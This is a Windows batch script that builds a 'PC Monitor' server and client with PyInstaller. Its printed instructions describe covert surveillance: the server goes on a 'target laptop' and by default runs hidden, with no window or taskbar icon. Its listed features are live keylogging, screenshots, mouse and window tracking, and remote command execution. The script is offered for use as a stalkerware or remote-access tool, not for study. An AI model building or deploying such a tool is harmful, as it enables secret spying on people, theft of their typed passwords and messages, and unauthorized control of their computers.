@echo off
echo ========================================
echo PC Monitor Build Script
echo ========================================
echo.

REM Check if PyInstaller is installed
pip show pyinstaller >nul 2>&1
if errorlevel 1 (
    echo Installing PyInstaller...
    pip install pyinstaller
    echo.
)

REM ========================================
REM BUILD CONFIGURATION
REM ========================================
echo Select what to build:
echo 1. Build Server only (PCMonitor.exe)
echo 2. Build Client only (PCMonitorClient.exe)
echo 3. Build Both (Server + Client)
echo.
set /p BUILD_CHOICE="Enter choice (1-3) [default: 3]: "
if "%BUILD_CHOICE%"=="" set BUILD_CHOICE=3

echo.
echo Select console window mode:
echo 1. No console (silent background mode - recommended)
echo 2. With console (see output/debug info)
echo.
set /p CONSOLE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%CONSOLE_CHOICE%"=="" set CONSOLE_CHOICE=1

echo.
echo Select build optimization:
echo 1. Normal (faster build, larger file)
echo 2. Optimized (slower build, smaller file, includes UPX compression)
echo.
set /p OPTIMIZE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%OPTIMIZE_CHOICE%"=="" set OPTIMIZE_CHOICE=1

REM Set console flag
if "%CONSOLE_CHOICE%"=="1" (
    set CONSOLE_FLAG=--noconsole
    echo Using: No console window
) else (
    set CONSOLE_FLAG=--console
    echo Using: Console window enabled
)

REM Set optimization flags
if "%OPTIMIZE_CHOICE%"=="2" (
    set OPTIMIZE_FLAGS=--upx-dir=upx
    echo Using: Optimized build with compression
) else (
    set OPTIMIZE_FLAGS=
    echo Using: Normal build
)

echo.
echo ========================================
echo Starting Build...
echo ========================================
echo.

REM Clean previous builds
if exist build rmdir /s /q build
if exist dist rmdir /s /q dist
if exist *.spec del /q *.spec

REM ========================================
REM BUILD SERVER
REM ========================================
if "%BUILD_CHOICE%"=="1" goto BUILD_SERVER
if "%BUILD_CHOICE%"=="3" goto BUILD_SERVER
goto SKIP_SERVER

:BUILD_SERVER
echo ========================================
echo Building Server (PCMonitor.exe)...
echo ========================================
pyinstaller --onefile ^
    %CONSOLE_FLAG% ^
    --name "PCMonitor" ^
    --icon=NONE ^
    --hidden-import=flask ^
    --hidden-import=flask_cors ^
    --hidden-import=pynput ^
    --hidden-import=pynput.mouse ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=PIL ^
    --hidden-import=PIL.ImageGrab ^
    --hidden-import=win32gui ^
    --hidden-import=win32process ^
    --hidden-import=psutil ^
    --collect-all flask ^
    --collect-all flask_cors ^
    %OPTIMIZE_FLAGS% ^
    server.py

if errorlevel 1 (
    echo.
    echo [ERROR] Server build failed!
    echo.
    pause
    exit /b 1
)
echo [SUCCESS] Server built successfully!
echo.

:SKIP_SERVER

REM ========================================
REM BUILD CLIENT
REM ========================================
if "%BUILD_CHOICE%"=="2" goto BUILD_CLIENT
if "%BUILD_CHOICE%"=="3" goto BUILD_CLIENT
goto SKIP_CLIENT

:BUILD_CLIENT
echo ========================================
echo Building Client (PCMonitorClient.exe)...
echo ========================================
pyinstaller --onefile ^
    %CONSOLE_FLAG% ^
    --name "PCMonitorClient" ^
    --icon=NONE ^
    --hidden-import=PIL ^
    --hidden-import=PIL.Image ^
    --hidden-import=PIL.ImageTk ^
    --hidden-import=tkinter ^
    --hidden-import=requests ^
    %OPTIMIZE_FLAGS% ^
    client.py

if errorlevel 1 (
    echo.
    echo [ERROR] Client build failed!
    echo.
    pause
    exit /b 1
)
echo [SUCCESS] Client built successfully!
echo.

:SKIP_CLIENT

REM ========================================
REM BUILD COMPLETE
REM ========================================
echo.
echo ========================================
echo Build Complete!
echo ========================================
echo.
if "%BUILD_CHOICE%"=="1" (
    echo Server executable: dist\PCMonitor.exe
    dir dist\PCMonitor.exe | find "PCMonitor.exe"
)
if "%BUILD_CHOICE%"=="2" (
    echo Client executable: dist\PCMonitorClient.exe
    dir dist\PCMonitorClient.exe | find "PCMonitorClient.exe"
)
if "%BUILD_CHOICE%"=="3" (
    echo Server executable: dist\PCMonitor.exe
    echo Client executable: dist\PCMonitorClient.exe
    echo.
    dir dist\*.exe
)

echo.
echo ========================================
echo INSTALLATION INSTRUCTIONS
echo ========================================
echo.
echo SERVER SETUP (Target laptop):
echo 1. Copy dist\PCMonitor.exe to target laptop
if "%CONSOLE_CHOICE%"=="1" (
    echo 2. Run PCMonitor.exe - it will run silently in background
    echo    ^(Check config.json for API key after first run^)
) else (
    echo 2. Run PCMonitor.exe - console will show API key
)
echo 3. Copy the API key from config.json or console
echo 4. Keep PCMonitor.exe running
if "%CONSOLE_CHOICE%"=="1" (
    echo.
    echo NOTE: To see API key, run from command line once:
    echo    PCMonitor.exe
    echo    Then check config.json or the brief console output
)
echo.
echo CLIENT SETUP (Your monitoring PC):
echo 1. Copy dist\PCMonitorClient.exe to your PC
echo 2. Run PCMonitorClient.exe
echo 3. Go to Settings ^> Change Server
echo 4. Enter server URL (e.g., http://192.168.0.48:5000)
echo 5. Enter the API key from step 3 above
echo 6. Click "Save ^& Connect"
echo 7. Click "Start" to begin monitoring
echo.
echo ========================================
echo FEATURES
echo ========================================
echo - Live keylogging with text stream
echo - Automatic ^& manual screenshots
echo - Mouse click tracking
echo - Window change monitoring
echo - Event search and filtering
echo - Remote command execution
echo - Kill switch (stops server remotely)
echo - Data export (JSON format)
echo.
if "%CONSOLE_CHOICE%"=="1" (
    echo ========================================
    echo STEALTH MODE NOTES
    echo ========================================
    echo Server runs with NO visible window
    echo - No taskbar icon
    echo - No console window
    echo - Silent operation
    echo.
    echo To stop server:
    echo - Use Kill Switch from client
    echo - Or use Task Manager to end PCMonitor.exe
    echo.
)
echo ========================================
echo.
echo Press any key to view build folder...
pause >nul
explorer dist
echo.
echo Build process complete!
pause